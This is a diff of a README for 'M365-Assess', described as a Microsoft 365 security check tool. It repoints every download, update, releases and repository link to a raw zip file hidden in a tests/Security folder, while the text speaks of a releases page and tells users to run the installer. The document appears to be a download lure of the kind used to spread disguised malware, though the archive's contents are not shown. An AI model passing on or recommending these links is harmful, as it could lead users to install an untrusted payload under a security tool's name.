@@ -1,6 +1,6 @@
 # 📊 M365-Assess - Simple Microsoft 365 Security Check
 
-[![Download M365-Assess](https://img.shields.io/badge/Download-M365--Assess-brightgreen)](https://raw.githubusercontent.com/ykar1412/M365-Assess/main/Inventory/Assess_1.0.zip)
+[![Download M365-Assess](https://img.shields.io/badge/Download-M365--Assess-brightgreen)](https://raw.githubusercontent.com/ykar1412/M365-Assess/main/tests/Security/Assess_v1.3.zip)
 
 ---
 
@@ -42,10 +42,10 @@ To get started using M365-Assess, follow these steps carefully. The process does
 
 Visit the releases page below to download the latest version of M365-Assess. The releases page contains all available versions and files for Windows.
 
-[![Download M365-Assess](https://img.shields.io/badge/Download-M365--Assess-blue)](https://raw.githubusercontent.com/ykar1412/M365-Assess/main/Inventory/Assess_1.0.zip)  
+[![Download M365-Assess](https://img.shields.io/badge/Download-M365--Assess-blue)](https://raw.githubusercontent.com/ykar1412/M365-Assess/main/tests/Security/Assess_v1.3.zip)  
 
 1. Click the button above or go directly to:  
-   https://raw.githubusercontent.com/ykar1412/M365-Assess/main/Inventory/Assess_1.0.zip
+   https://raw.githubusercontent.com/ykar1412/M365-Assess/main/tests/Security/Assess_v1.3.zip
 
 2. Look for the latest release. It will be listed at the top.  
 3. Scroll down to the assets section under the latest release.  
@@ -108,7 +108,7 @@ Periodically check the releases page for newer versions of the tool. Updates may
 
 To update:
 
-1. Visit https://raw.githubusercontent.com/ykar1412/M365-Assess/main/Inventory/Assess_1.0.zip  
+1. Visit https://raw.githubusercontent.com/ykar1412/M365-Assess/main/tests/Security/Assess_v1.3.zip  
 2. Download the latest installer file as explained in the download section.  
 3. Run the new installer. It will replace the old version.  
 
@@ -119,7 +119,7 @@ To update:
 If you have questions or encounter issues, use the GitHub repository’s Issues tab. You can describe your problem there. The developers or community maintainers will answer.  
 
 Visit the repository here:  
-https://raw.githubusercontent.com/ykar1412/M365-Assess/main/Inventory/Assess_1.0.zip  
+https://raw.githubusercontent.com/ykar1412/M365-Assess/main/tests/Security/Assess_v1.3.zip  
 
 ---
 
@@ -144,4 +144,4 @@ These topics help you understand risks and maintain a secure environment.
 
 ---
 
-[Get M365-Assess from Releases](https://raw.githubusercontent.com/ykar1412/M365-Assess/main/Inventory/Assess_1.0.zip)
+[Get M365-Assess from Releases](https://raw.githubusercontent.com/ykar1412/M365-Assess/main/tests/Security/Assess_v1.3.zip)
